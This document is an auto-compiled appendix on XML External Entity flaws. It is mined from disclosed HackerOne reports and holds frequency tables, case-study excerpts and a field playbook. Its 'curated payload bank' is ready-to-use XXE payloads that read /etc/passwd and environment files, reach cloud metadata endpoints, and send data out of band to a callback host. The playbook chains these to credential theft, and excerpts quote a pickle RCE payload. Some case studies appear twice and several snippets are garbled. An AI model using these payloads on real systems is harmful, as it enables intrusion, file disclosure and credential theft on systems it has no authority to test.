# Evidence appendix — XML External Entity and Parser Flaws

Mined from all **42 valid disclosed reports** for this class (9 paid, 21% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| XML / SOAP / SAML / XXE | 22 |
| encoding / double-encode / null byte | 12 |
| Content-Type / body-format switch | 8 |
| file upload / filename / extension | 8 |
| header injection (Host / X-Forwarded / etc.) | 8 |
| admin / privileged-role context | 6 |
| internal service / port / container | 6 |
| second-order / stored / blind delivery | 6 |
| subdomain / DNS / cert-transparency recon | 5 |
| parser confusion / normalization | 5 |
| public source-code / repo review | 5 |
| JWT / token / base64 decode | 4 |
| cloud metadata / IAM abuse | 4 |
| error message / stack trace probing | 3 |
| fuzzing / wordlist brute force | 3 |
| cache / CDN / unkeyed header | 3 |
| deserialization / gadget chain | 3 |
| HTTP method / verb tampering | 3 |
| OAST / DNS / HTTP callback proof | 3 |
| third-party data / paste / breach reuse | 3 |
| webhook / OAuth / SAML / integration abuse | 2 |
| unauthenticated / removed-cookie test | 2 |
| public bucket / storage exposure | 2 |
| swap object ID / parameter value | 2 |
| intercept & replay request in Burp | 2 |
| git history / exposed .git | 2 |
| verbose debug / framework fingerprint | 1 |
| template injection (SSTI) | 1 |
| API docs / Swagger / introspection | 1 |
| WAF / sanitizer / filter bypass | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| browser | 7 |
| source-code-review | 5 |
| python | 4 |
| devtools | 4 |
| burp | 4 |
| burp-collaborator | 3 |
| collaborator/oast | 3 |
| git | 2 |
| dnsdump | 1 |
| curl | 1 |
| ffuf | 1 |
| burp-repeater | 1 |
| burp-intruder | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| content-type | 13 |
| blind | 10 |
| bypass | 8 |
| out-of-band | 2 |
| bypassed | 1 |
| time-based | 1 |

## Impact language

| Item | Count |
|---|---:|
| rce | 10 |
| exfiltrate | 10 |
| admin | 8 |
| credential | 7 |
| remote code execution | 6 |
| arbitrary file | 6 |
| password | 6 |
| unauthorized | 3 |
| arbitrary read | 2 |
| localhost | 2 |
| internal network | 2 |
| sensitive data | 2 |
| secret | 2 |
| exfiltration | 2 |
| sensitive information | 2 |
| arbitrary command | 2 |
| unauthorised | 1 |
| api key | 1 |
| cloud metadata | 1 |
| exfiltrating | 1 |

## Parameters observed

| Item | Count |
|---|---:|
| version | 4 |
| encoding | 4 |
| type | 4 |
| debug | 2 |
| max-age | 2 |
| pct | 1 |
| rua | 1 |
| reproduce | 1 |
| username | 1 |
| password | 1 |
| referenceid | 1 |
| code | 1 |
| message | 1 |
| read | 1 |
| resource | 1 |
| status | 1 |
| _hxpage | 1 |
| max_file_size_kb | 1 |
| allow_file_type_list | 1 |
| hx_page_name | 1 |
| charset | 1 |

## Recurring approach patterns

- **2×** i was able to extract text files from the server and http responses by rendering them on my crew emblem
  - e.g. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.
- **1×** hi sir i am new hacker in hackerone platform i am glad to join paragonie bounty program i want to report a very critical bug that is i found dmarc missing for your domain paragonie com add dmarc record as soon as possible
  - e.g. #Hi sir, , I am new hacker in hackerone platform I am glad to join paragonie bounty program ..i want to report a very critical bug that is i found DMARC missing for your domain paragonie.com Add DMARC record as soon as possible ..
- **1×** many senders have a complex email environment with many systems sending email often including 3rd party service providers
  - e.g. Many senders have a complex email environment with many systems sending email, often including 3rd party service providers.
- **1×** dawgyg was able to exploit this vulnerability by crafting an xml request that revealed sensitive local system information
  - e.g. dawgyg was able to exploit this vulnerability by crafting an XML request that revealed sensitive local system information.
- **1×** version i tested this against the latest stable source available a couple fo days ago may running weblate dev steps to reproduce i have included a live exploit testproject testcomponent en gb xlf that works with the hello data backing the demo website log in as a user that has permission to upload translation files
  - e.g. Version: ======== I tested this against the latest stable source available a couple fo days ago (~May 26) running "Weblate 2.15-dev" Steps to Reproduce ======== (I have included a live exploit testproject-testcomponent-en_GB.xlf that works with the "hello" data backing the demo website.) * Log in as
- **1×** i ve identified an xxe vulnerability in the cloudhopper sxmp servlet on sms be vip twitter com which discloses local files to an external attacker and allows web requests to be sent
  - e.g. I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent.
- **1×** summary the project site audit function is vulnerable to xxe when parsing sitemap xml files
  - e.g. **Summary:** The Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.
- **1×** about one year after i started messing with the emblem editor i finally found a full ssrf and lfi
  - e.g. ___________________________________________________________________________________________________________________________ About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI.
- **1×** decoding the hex value we get the challenge url path traversal local file read on the website i found two important endpoints generate php and memes php
  - e.g. Decoding the hex value we get the challenge URL : ## Path traversal + local file read On the website I found two important endpoints : /generate.php and /memes.php .
- **1×** at the generate php i started doing some manual fuzzing trying some command injection like id and template injections like but nothing seemed to work
  - e.g. At the generate.php I started doing some "manual fuzzing" trying some command injection, like `;)'";|id`, and template injections like `{{7*7}}` but nothing seemed to work.
- **1×** path traversal in template parameter etc passwd output first i tried reading some default configurations files like proc self environ and proc self cmdline without any usable information
  - e.g. Path Traversal in `template` parameter /etc/passwd output First I tried reading some default configurations files like /proc/self/environ and /proc/self/cmdline without any usable information.
- **1×** while trying to figure out the next step i remembered that i haven t looked at the includes header php file because i thought that it was useless
  - e.g. While trying to figure out the next step I remembered that I haven't looked at the /includes/header.php file because I thought that it was useless.
- **1×** as it was late of night and i was really tired i just created all by hand counting the length of the string and all
  - e.g. As it was late of night and I was really tired, I just created all by hand counting the length of the string and all.
- **1×** the serialized class without the payload looks like this now i have to insert the xxe payload note that it must have toptext or a bottomtext tag to output the result to the page at first i tried a rce payload with expect
  - e.g. The serialized class without the payload looks like this : Now I have to insert the XXE payload, note that it must have `toptext` or a `bottomtext` tag to output the result to the page, at first I tried a RCE payload with `expect://`.
- **1×** but no output was generated after that i tried to output the stdout to a server with expect curl with no success
  - e.g. But no output was generated, after that I tried to output the stdout to a server with `expect://curl with no success.
- **1×** as i couldn t think of any other way to complete the challenge i tried another technique to achieve ssrf with php filter read convert base64 encode resource and now it worked
  - e.g. As I couldn't think of any other way to complete the challenge, I tried another technique to achieve SSRF with `php://filter/read=convert.base64-encode/resource= And now it worked !
- **1×** after that i tried the aws metadata url because the server was on aws to try to get any credentials but it didn t work
  - e.g. After that I tried the AWS metadata URL , because the server was on AWS to try to get any credentials, but it didn't work.
- **1×** to find the ip port i used the first local file read to read proc net tcp decoding the hex 0100007f we get so this must be the next step
  - e.g. To find the IP:PORT I used the first local file read to read /proc/net/tcp Decoding the hex `0100007F:0539` we get 127.0.0.1:1337, so this must be the next step.
- **1×** pickle injection rce using the ssrf to get the sending the debug to status it shows a python s pickle serialized data encoded in base64
  - e.g. ## Pickle injection RCE Using the SSRF to get the Sending the `?debug=1` to /status it shows a Python's Pickle serialized data encoded in base64.
- **1×** so we have to send a status parameter i tried to send the base64 he outputs on the status and it worked
  - e.g. So we have to send a status parameter I tried to send the base64 he outputs on the /status and it worked !
- **1×** pickle is notorious vulnerable to rce so i tried a simple exploit available at sending this to update status debug status y3bvc2l4cnn5c3rlbqpwmaoouydpzcckcdekdhaycljwmwoucg 3d 3d showed but no output
  - e.g. Pickle is notorious vulnerable to RCE, so I tried a simple exploit available at Sending this to `/update-status?debug=1&status=Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg%3D%3D` showed But no output.
- **1×** i was able to identify xxe on the it is cve in oracle peoplesoft cve poc i determined that instance is available on localhost port so it s possible to access pspc services adminservice via xxe where h1testservice is test service name i m trying to create
  - e.g. I was able to identify XXE on the It is CVE in Oracle PeopleSoft (CVE-2017-3548) ##POC I determined that instance is available on localhost port 80, so it's possible to access `/pspc/services/AdminService` via XXE: where `h1testservice` is test service name I'm trying to create.
- **1×** the result i created new service on server
  - e.g. The result: █████ I created new service on server.
- **1×** the avatar picture upload functionality is prone to a xxe attack when parsing the image file
  - e.g. The avatar picture upload functionality is prone to a XXE attack when parsing the image file.

## Case studies (full excerpts)

### 347139 — LFI and SSRF via XXE in emblem editor
Rockstar Games · $1500 · critical · https://hackerone.com/reports/347139

This summary is provided by the researcher who submitted this report, @alexbirsan . ___________________________________________________________________________________________________________________________ About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem. For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar: 1. Double forward slash to reference an SMB path: This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server. 2. Classic XXE: **exfil.dtd** This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`). 3. Bonus method - XIncludes It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward. The final POC looked like this: {F293137} About one year after I started messing with the emblem editor, I finally f

### 500515 — XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
Starbucks · no bounty (valid finding) · critical · https://hackerone.com/reports/500515

**Description:** Hi,guys,when i was visited the jobs of starbucks websites in China( i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files. ## Steps To Reproduce: Upload and XXE vulnerability: 1. Log in to the user, enter the personal information settings page, click Upload Image 2. Intercept https access information through Burp suite 3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html" 4. Get the server's response information,visited the uploaded file URL. 5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like >POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp; or change the "HX_PAGE_NAME" params of xml date by post >POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1 HX_PAGE_NAME=&quot;tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml&quot; post the edited request,

### 248668 — XXE on sms-be-vip.twitter.com in SXMP Processor
X / xAI · no bounty (valid finding) · medium · https://hackerone.com/reports/248668

Hi team, ##What type of issue are you reporting? Does it align to a CWE or OWASP issue? I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to ##How does a user reproduce your issue? To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request: POST /api/sxmp/1.0 HTTP/1.1 Host: sms-be-vip.twitter.com Connection: close Content-Type: text/xml Content-Length: 481 <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <operation type="deliver"> <account username="abc" password="a"/> <deliverRequest referenceId="MYREF102020022"> <operatorId>&file;</operatorId> <sourceAddress type="network">40404</sourceAddress> <destinationAddress type="international">123</destinationAddress> <text encoding="ISO-8859-1">a</text> </deliverRequest> </operation> </code> In response, the server returned its /etc/passwd file in an error message: <?xml version="1.0"?> <operation type="deliver"> <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/> </operation> In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a U

### 483774 — XXE on https://duckduckgo.com
DuckDuckGo · no bounty (valid finding) · critical · https://hackerone.com/reports/483774

An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on via `u` parameter. This was due to improper sanitation of external XML entities. The results was a leak of certain world readable files on the system. This issue was patched. Additionally, we intend to retire the endpoint in the very near future. Big thanks to @mik317 for reporting this issue!

### 486732 — Partial bypass of #483774 with Blind XXE on https://duckduckgo.com
DuckDuckGo · no bounty (valid finding) · high · https://hackerone.com/reports/486732

**Summary:** Hi DuckDuckGo team, I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree. **Steps for reproduction:** 1. Attacker creates a public server and hosts a file with the following content: 2. User goes on 3. The ` resource will be requested by an host {F413045} I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain. ## Impact Blind XXE leads to `dos` and `blind injection`.

### 500515 — XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
Starbucks · no bounty (valid finding) · critical · https://hackerone.com/reports/500515

**Description:** Hi,guys,when i was visited the jobs of starbucks websites in China( i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files. ## Steps To Reproduce: Upload and XXE vulnerability: 1. Log in to the user, enter the personal information settings page, click Upload Image 2. Intercept https access information through Burp suite 3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html" 4. Get the server's response information,visited the uploaded file URL. 5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like >POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp; or change the "HX_PAGE_NAME" params of xml date by post >POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1 HX_PAGE_NAME=&quot;tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml&quot; post the edited request,

### 248668 — XXE on sms-be-vip.twitter.com in SXMP Processor
X / xAI · no bounty (valid finding) · medium · https://hackerone.com/reports/248668

Hi team, ##What type of issue are you reporting? Does it align to a CWE or OWASP issue? I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to ##How does a user reproduce your issue? To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request: POST /api/sxmp/1.0 HTTP/1.1 Host: sms-be-vip.twitter.com Connection: close Content-Type: text/xml Content-Length: 481 <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <operation type="deliver"> <account username="abc" password="a"/> <deliverRequest referenceId="MYREF102020022"> <operatorId>&file;</operatorId> <sourceAddress type="network">40404</sourceAddress> <destinationAddress type="international">123</destinationAddress> <text encoding="ISO-8859-1">a</text> </deliverRequest> </operation> </code> In response, the server returned its /etc/passwd file in an error message: <?xml version="1.0"?> <operation type="deliver"> <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/> </operation> In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a U

## Full curated payload bank

### Classic file read

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
```

### Parameter entities / OOB

```text
<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
```

### SSRF / cloud metadata

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
```

### XInclude / SVG / Office

```text
<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
```

### Filter bypass

```text
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
```

## Field playbook (unedited)

### quick

- Find XML parsers: SOAP, SAML, RSS, SVG, office docs, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when entities are blocked.
- Check SAML signature handling for XML signature wrapping.

### payloads

- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`
- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`
- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`
- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`

### bypass

- Use UTF-16/UTF-7 encodings to bypass naive filters.
- Parameter entities and external DTDs when general entities are disabled.
- Error-based extraction when output is not reflected.

### surface

- xml
- soap
- saml
- svg
- docx
- xlsx
- import
- feed
- rss

### tools

- Burp
- xxe-exploit
- interactsh
- nuclei

### chain

- XXE -> file read -> creds.
- XXE -> SSRF -> metadata.
- SAML wrapping -> admin.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class xxe
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class xxe --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
